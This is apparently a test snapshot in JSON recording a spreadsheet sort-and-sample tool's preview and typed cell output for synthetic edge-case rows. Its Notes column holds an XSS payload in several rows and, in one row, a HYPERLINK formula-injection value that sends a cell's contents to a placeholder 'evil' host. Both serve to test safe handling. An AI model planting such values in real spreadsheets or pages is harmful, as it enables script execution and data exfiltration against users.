@@ -1,0 +1,389 @@
+{
+ "json": {
+  "extra_sheets": [],
+  "notes": [],
+  "preview": {
+   "columns": [
+    "ID",
+    "Zip",
+    "Account",
+    "BigId",
+    "Amount",
+    "Region",
+    "Date",
+    "DateText",
+    "EuroNum",
+    "Pct",
+    "Flag",
+    "Name",
+    "Email",
+    "Notes"
+   ],
+   "rows": [
+    {
+     "Account": "1001",
+     "Amount": "-262.5",
+     "BigId": "9007199254740994",
+     "Date": "2024-01-02 00:00:00",
+     "DateText": "2024-03-05",
+     "Email": null,
+     "EuroNum": "1.234,56",
+     "Flag": "False",
+     "ID": "PR-00002",
+     "Name": "Bob",
+     "Notes": "x|||y",
+     "Pct": "0.5",
+     "Region": "S",
+     "Zip": "01007"
+    },
+    {
+     "Account": "1002",
+     "Amount": "-225",
+     "BigId": "9007199254740995",
+     "Date": "2024-01-03 00:00:00",
+     "DateText": "13/02/2024",
+     "Email": "carol2@example.com",
+     "EuroNum": "10",
+     "Flag": "True",
+     "ID": "PR-00003",
+     "Name": "Carol",
+     "Notes": "<img src=x onerror=alert(1)>",
+     "Pct": "12.5%",
+     "Region": null,
+     "Zip": "01014"
+    },
+    {
+     "Account": "1006",
+     "Amount": "-75",
+     "BigId": "9007199254740999",
+     "Date": "2024-01-07 00:00:00",
+     "DateText": "01/02/2024",
+     "Email": "carol6@example.com",
+     "EuroNum": "2,5",
+     "Flag": "True",
+     "ID": "PR-00007",
+     "Name": "Carol",
+     "Notes": "<img src=x onerror=alert(1)>",
+     "Pct": "50%",
+     "Region": "N",
+     "Zip": "01042"
+    },
+    {
+     "Account": "1008",
+     "Amount": "0",
+     "BigId": "9007199254741001",
+     "Date": "2024-01-09 00:00:00",
+     "DateText": "13/02/2024",
+     "Email": "alice8@example.com",
+     "EuroNum": "10",
+     "Flag": "True",
+     "ID": "PR-00009",
+     "Name": "Alice",
+     "Notes": "=HYPERLINK(\"http://evil/?\"&A2,\"x\")",
+     "Pct": "12.5%",
+     "Region": null,
+     "Zip": "01056"
+    },
+    {
+     "Account": "1022",
+     "Amount": "525",
+     "BigId": "9007199254741015",
+     "Date": "2024-01-23 00:00:00",
+     "DateText": "2024-03-05",
+     "Email": "carol22@example.com",
+     "EuroNum": "1.234,56",
+     "Flag": "True",
+     "ID": "PR-00023",
+     "Name": "Carol",
+     "Notes": "<img src=x onerror=alert(1)>",
+     "Pct": "0.5",
+     "Region": "S",
+     "Zip": "01154"
+    },
+    {
+     "Account": "1025",
+     "Amount": "637.5",
+     "BigId": "9007199254741018",
+     "Date": "2024-01-26 00:00:00",
+     "DateText": "2024-03-05",
+     "Email": "bob25@example.com",
+     "EuroNum": "1.234,56",
+     "Flag": "False",
+     "ID": "PR-00026",
+     "Name": "Bob",
+     "Notes": "x|||y",
+     "Pct": "0.5",
+     "Region": "S",
+     "Zip": "01175"
+    },
+    {
+     "Account": "1029",
+     "Amount": "787.5",
+     "BigId": "9007199254741022",
+     "Date": "2024-01-30 00:00:00",
+     "DateText": "13/02/2024",
+     "Email": "bob29@example.com",
+     "EuroNum": "10",
+     "Flag": "False",
+     "ID": "PR-00030",
+     "Name": "Bob",
+     "Notes": "x|||y",
+     "Pct": "12.5%",
+     "Region": null,
+     "Zip": "01203"
+    },
+    {
+     "Account": "1033",
+     "Amount": "937.5",
+     "BigId": "9007199254741026",
+     "Date": "2024-02-03 00:00:00",
+     "DateText": "01/02/2024",
+     "Email": "bob33@example.com",
+     "EuroNum": "2,5",
+     "Flag": "False",
+     "ID": "PR-00034",
+     "Name": "Bob",
+     "Notes": "x|||y",
+     "Pct": "50%",
+     "Region": "N",
+     "Zip": "01231"
+    },
+    {
+     "Account": "1035",
+     "Amount": "1012.5",
+     "BigId": "9007199254741028",
+     "Date": "2024-02-05 00:00:00",
+     "DateText": "13/02/2024",
+     "Email": "dave35@example.com",
+     "EuroNum": "10",
+     "Flag": "False",
+     "ID": "PR-00036",
+     "Name": "Dave",
+     "Notes": "café",
+     "Pct": "12.5%",
+     "Region": null,
+     "Zip": "01245"
+    }
+   ],
+   "total_rows": 9
+  },
+  "success": true,
+  "summary": [
+   [
+    "Rows in",
+    40
+   ],
+   [
+    "Rows out",
+    9
+   ],
+   [
+    "Sample seed",
+    3
+   ]
+  ]
+ },
+ "output": {
+  "Sheet1": [
+   [
+    "s:'ID'",
+    "s:'Zip'",
+    "s:'Account'",
+    "s:'BigId'",
+    "s:'Amount'",
+    "s:'Region'",
+    "s:'Date'",
+    "s:'DateText'",
+    "s:'EuroNum'",
+    "s:'Pct'",
+    "s:'Flag'",
+    "s:'Name'",
+    "s:'Email'",
+    "s:'Notes'"
+   ],
+   [
+    "s:'PR-00002'",
+    "s:'01007'",
+    "n:1001",
+    "s:'9007199254740994'",
+    "n:-262.5",
+    "s:'S'",
+    "d:'2024-01-02T00:00:00'",
+    "s:'2024-03-05'",
+    "s:'1.234,56'",
+    "n:0.5",
+    "b:False",
+    "s:'Bob'",
+    "n:None",
+    "s:'x|||y'"
+   ],
+   [
+    "s:'PR-00003'",
+    "s:'01014'",
+    "n:1002",
+    "s:'9007199254740995'",
+    "n:-225",
+    "n:None",
+    "d:'2024-01-03T00:00:00'",
+    "s:'13/02/2024'",
+    "s:'10'",
+    "s:'12.5%'",
+    "b:True",
+    "s:'Carol'",
+    "s:'carol2@example.com'",
+    "s:'<img src=x onerror=alert(1)>'"
+   ],
+   [
+    "s:'PR-00007'",
+    "s:'01042'",
+    "n:1006",
+    "s:'9007199254740999'",
+    "n:-75",
+    "s:'N'",
+    "d:'2024-01-07T00:00:00'",
+    "s:'01/02/2024'",
+    "s:'2,5'",
+    "s:'50%'",
+    "b:True",
+    "s:'Carol'",
+    "s:'carol6@example.com'",
+    "s:'<img src=x onerror=alert(1)>'"
+   ],
+   [
+    "s:'PR-00009'",
+    "s:'01056'",
+    "n:1008",
+    "s:'9007199254741001'",
+    "n:0",
+    "n:None",
+    "d:'2024-01-09T00:00:00'",
+    "s:'13/02/2024'",
+    "s:'10'",
+    "s:'12.5%'",
+    "b:True",
+    "s:'Alice'",
+    "s:'alice8@example.com'",
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+   ],
+   [
+    "s:'PR-00023'",
+    "s:'01154'",
+    "n:1022",
+    "s:'9007199254741015'",
+    "n:525",
+    "s:'S'",
+    "d:'2024-01-23T00:00:00'",
+    "s:'2024-03-05'",
+    "s:'1.234,56'",
+    "n:0.5",
+    "b:True",
+    "s:'Carol'",
+    "s:'carol22@example.com'",
+    "s:'<img src=x onerror=alert(1)>'"
+   ],
+   [
+    "s:'PR-00026'",
+    "s:'01175'",
+    "n:1025",
+    "s:'9007199254741018'",
+    "n:637.5",
+    "s:'S'",
+    "d:'2024-01-26T00:00:00'",
+    "s:'2024-03-05'",
+    "s:'1.234,56'",
+    "n:0.5",
+    "b:False",
+    "s:'Bob'",
+    "s:'bob25@example.com'",
+    "s:'x|||y'"
+   ],
+   [
+    "s:'PR-00030'",
+    "s:'01203'",
+    "n:1029",
+    "s:'9007199254741022'",
+    "n:787.5",
+    "n:None",
+    "d:'2024-01-30T00:00:00'",
+    "s:'13/02/2024'",
+    "s:'10'",
+    "s:'12.5%'",
+    "b:False",
+    "s:'Bob'",
+    "s:'bob29@example.com'",
+    "s:'x|||y'"
+   ],
+   [
+    "s:'PR-00034'",
+    "s:'01231'",
+    "n:1033",
+    "s:'9007199254741026'",
+    "n:937.5",
+    "s:'N'",
+    "d:'2024-02-03T00:00:00'",
+    "s:'01/02/2024'",
+    "s:'2,5'",
+    "s:'50%'",
+    "b:False",
+    "s:'Bob'",
+    "s:'bob33@example.com'",
+    "s:'x|||y'"
+   ],
+   [
+    "s:'PR-00036'",
+    "s:'01245'",
+    "n:1035",
+    "s:'9007199254741028'",
+    "n:1012.5",
+    "n:None",
+    "d:'2024-02-05T00:00:00'",
+    "s:'13/02/2024'",
+    "s:'10'",
+    "s:'12.5%'",
+    "b:False",
+    "s:'Dave'",
+    "s:'dave35@example.com'",
+    "s:'café'"
+   ]
+  ],
+  "_DataDragon_Log": [
+   [
+    "s:'Item'",
+    "s:'Value'"
+   ],
+   [
+    "s:'Tool'",
+    "s:'Sort, Rank & Sample'"
+   ],
+   [
+    "s:'Version'",
+    "s:'<VERSION>'"
+   ],
+   [
+    "s:'Timestamp (UTC)'",
+    "s:'<TIMESTAMP>'"
+   ],
+   [
+    "s:'Rows in'",
+    "s:'40'"
+   ],
+   [
+    "s:'Rows out'",
+    "s:'9'"
+   ],
+   [
+    "s:'Parameters'",
+    "s:'{\"keep\": \"sample\", \"rank\": false, \"rows_before_keep\": 40, \"rows_out\": 9, \"sort_levels\": 0}'"
+   ],
+   [
+    "s:'Warnings'",
+    "s:''"
+   ],
+   [
+    "s:'Step'",
+    "s:'{\"options\": {\"count\": 9, \"direction1\": \"ascending\", \"direction2\": \"ascending\", \"direction3\": \"ascending\", \"keep\": \"sample\", \"rank\": false, \"rank_within\": null, \"seed\": 3, \"sort1\": null, \"sort2\": null, \"sort3\": null}, \"tool\": \"sort-and-sample\"}'"
+   ]
+  ]
+ },
+ "status": 200
+}
